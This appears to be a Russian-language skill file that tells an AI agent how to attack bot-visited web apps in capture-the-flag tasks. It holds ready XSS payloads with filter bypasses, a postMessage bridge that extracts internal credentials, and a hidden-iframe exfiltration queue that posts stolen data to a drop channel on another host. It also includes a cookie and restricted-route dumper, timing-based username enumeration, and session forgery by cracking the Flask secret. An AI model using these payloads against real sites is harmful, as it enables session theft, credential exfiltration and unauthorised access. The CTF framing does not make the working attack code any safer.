---
name: browser-bot-bridge
description: Используй этот скилл, когда в задаче есть бот-ревьюер/аудитор, headless-браузер или визиты ботов: XSS-векторы, postMessage-мосты к внутренним данным, seal-креды, дроп-каналы эксфильтрации, окна визитов, CMS-виджеты, timing/register-оракулы. Также если таск похож на «портал+деск+боты» и нужен максимальный дампер.
---
# Browser-Bot-Bridge — боты, мосты и дропы в Web-CTF

## 1. Каркас задачи (паттерн-детектор)
Два сервиса: «портал» (роли, цель-маршрут, внутренние API) + «деск/консьерж» (публичный виджет с XSS, репорт-форма, дроп-канал). Боты: reviewer-бот открывает только внешние URL виджета; audit/finance-бот открывает только внутренние маршруты своей роли. Финальный маршрут (vault/report/export) закрыт «даже при правильной роли» для браузерных запросов.

## 2. Первые 10 шагов (проверенный порядок)
1. Прочитать ВЕСЬ JS обеих сторон: postMessage-типы, trusted-origin из #portal-config, fetch-цели, template-литералы (${var} в innerHTML = stored-XSS).
2. Найти DOM-XSS виджета: параметры, попадающие в setTimeout("..."+x+"...")/eval — фильтр < и > обходится payload без угловых скобок: ');CODE// (закрыть кавычку И скобку вызова), сравнения !== вместо <.
3. Мост: XSS виджета → window.open(портал-страница) → popup.postMessage({type:'REQUEST_...'}, портал-origin) → страница портала делает same-origin internal-fetch и шлёт ответ event.source. Так добываются internal-креды (seal) без кражи кук.
4. Импорт контента в чужую ленту: internal POST + заголовок-кред (например X-Review-Seal). Seal живёт сутками, работает без сессии — проверить.
5. Валидатор ссылок в репортах: проверять И «нечистые» префиксы (/./route, %2f), нормализация бывает инверсной (обход = «эскалация»).
6. Дроп-канал: /api/drop/{slug} — писать form-POST (content=..., сохраняется сырое тело) или same-origin JSON; читать GET; накопительный.
7. Эксфиль из сессии бота при CSP connect 'self': form-action обычно НЕ задан → скрытый iframe + form POST в дроп. Очередь обязательна: последовательные submit в один iframe теряются — следующий после onload.
8. Дифференциация 403: HTML «Locked» = ролевой отказ; JSON без body (iframe contentDocument.body===null) = поведенческий фильтр («review browsers cannot fetch») → нужен не-браузерный запрос с чужой сессией.
9. Timing-оракул имён: login с хэшем ~550-800мс vs ~160-370мс — перечисление usernames, включая имена ботов.
10. Реконструкция окон ботов: только по HTTP Date; updated_at дропа = момент визита; инициализационные строки в логе поллера маскируются под «свежие визиты» — сверять updated_at.

## 3. Шаблоны (боевые)

**Пейлоады, передаваемые в URL (навигация бота), — целиком в base64-обёртке** `onerror="eval(atob('<b64>'))"`: сырой JS с `&`/кавычками рвётся о разрезание query (см. §4).

### Виджет-XSS (draft, без <>)
```
js = "fetch('/api/drop/SLUG',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'RUN '+navigator.userAgent.slice(0,40)})});"
draft = "');" + js + "//"
url = DESK + "/widget?draft=" + encodeURIComponent(draft)
// триггер: POST /api/report {category:'vendor', message:'Repro URL: '+url}
```

### Мост seal (в виджет-XSS браузера reviewer-бота)
```
var w = window.open('http://PORTAL/finance/inbox');
setTimeout(function(){ w.postMessage({type:'REQUEST_ESCALATION_SEAL'}, 'http://PORTAL'); }, 1200);
window.addEventListener('message', function(e){
  fetch('/api/drop/SLUG', {..., body: JSON.stringify({content:'MSG '+JSON.stringify(e.data).slice(0,600)})});
});
```

### Stored-XSS ленты + надёжный form-эксфиль (в сессии целевого бота)
```
var Q=[];var busy=false;
var hf=document.createElement('iframe');hf.name='hf';hf.style.display='none';document.body.appendChild(hf);
hf.onload=function(){setTimeout(nx,350);};
function nx(){if(busy||Q.length===0)return;busy=true;var m=Q.shift();
  var f=document.createElement('form');f.method='POST';f.action='http://DESK/api/drop/SLUG';f.target='hf';
  var a=document.createElement('input');a.name='content';a.value=m;f.appendChild(a);
  document.body.appendChild(f);f.submit();}
function ex(m){Q.push(m);nx();}
// note_html: '<img src=x onerror="' + js + '">'   (iframe src="widget?draft=..." тоже работает)
```

### Импорт в ленту (seal)
POST http://PORTAL/api/escalations/import, X-Review-Seal: seal_xxx, JSON {"note_html","subject","vendor_name"} → {"memo_id":N}

### Дампер из сессии бота (один визит = максимум данных)
```
ex('COOKIE len='+document.cookie.length+' '+document.cookie.slice(0,200)); // HttpOnly?
fetch('/vault/final-report',{credentials:'include'}).then(r=>r.text().then(t=>ex('VAULT '+r.status+' '+t.slice(0,1200))));
fetch('/api/finance/banner',{credentials:'include'}).then(r=>r.text().then(t=>ex('BANNER '+t.slice(0,300))));
// + iframe целевого маршрута: contentDocument.body null => JSON-фильтр; иначе body.innerText
```

## 4. Ловушки
- **Амперсанд-ловушка (полевой тест 2026-10-22):** JS внутри URL, по которому навигируется бот, не может содержать `&` — query режется, пейлоад обрывается на битом синтаксисе. Решение: весь JS в base64 (`eval(atob(...))`).
- **Окно бота = одна версия пейлоада:** очередь заявок часто LIFO (рендерится только последняя), интервал визитов 30 с – 10 мин с джиттером. Сначала измерь интервал двумя дешёвыми зондами; первая XSS-версия — сразу максимальный дампер (куки + закрытые маршруты кусками + ссылки + grep по префиксу флага), а не минимальный проб: каждая итерация = окно бота = до 10 минут.
- webhook.site PATCH default_content может отказать («Token not found»); запасной контент-хостинг — paste.rs (`curl --data-binary @f https://paste.rs/`), но Content-Type text/plain — DOM-парсеру бота не годится.
- Импорт/internal-эндпоинты — на ПОРТАЛЕ, не на деске; 404 ≠ протухший seal.
- Register-оракул одноразовый: probe несуществующего имени сжигает канал.
- Боты «раз в ~6 часов»: активный поллинг в контексте сжигает бюджет — только фоновый сторож с уведомлением об изменении дропа.
- Фоновые процессы воркеров умирают вместе с их сессией: критичные поллеры — resume-safe с файлом состояния.
- Лента может рендерить только последние N мемо: свежие пейлоады сажать прямо перед окном визита.
- Кука сессии почти наверняка HttpOnly: планировать не «украсть куку», а «подделать сессию» (Flask SECRET rockyou-офлайн + перебор user_id) или не-браузерный SSRF-путь.
- Shared-инстанс: чужие пейлоады в ленте — читать их (b64 decode), но их каналы могут быть уже сожжены.

## 5. Чек-лист «финального замка» (цель закрыта «даже при правильной роли»)
- [ ] тело 403 у разных ролей/контекстов (fetch/iframe/navigation) — JSON vs HTML.
- [ ] микрокопия дашборда («released after...», «use concierge...») — механизм релиза.
- [ ] полный rockyou на Flask SECRET (salt cookie-session) + перебор user_id.
- [ ] полный rockyou по имени бота (timing-оракул подтверждает существование).
- [ ] SSRF-кандидаты: internal-мосты, валидаторы URL, консьерж-эндпоинты.
- [ ] reviewer-навигация на цель (XSS на целевой странице, если она рендерит user-content).
- [ ] масс-присвоение ролей (register/profile/import, JSON+form, PATCH/PUT).
